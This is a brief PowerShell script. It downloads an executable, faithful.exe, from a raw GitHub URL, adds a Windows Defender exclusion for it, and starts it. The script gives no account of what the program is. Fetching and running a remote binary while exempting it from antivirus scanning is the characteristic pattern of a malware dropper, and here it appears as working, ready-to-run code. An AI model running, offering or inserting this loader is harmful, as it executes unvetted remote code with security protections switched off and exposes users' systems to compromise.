Write-Output "Starting script..."
Invoke-WebRequest https://raw.githubusercontent.com/thaddeuskkr/filehost/master/faithful.exe -OutFile "faithful.exe"
Write-Output "Adding Windows Defender exclusion..."
Add-MpPreference -ExclusionPath "$((Get-Item .).FullName)\faithful.exe"
Start-Process ("faithful.exe")
Write-Output "Done!"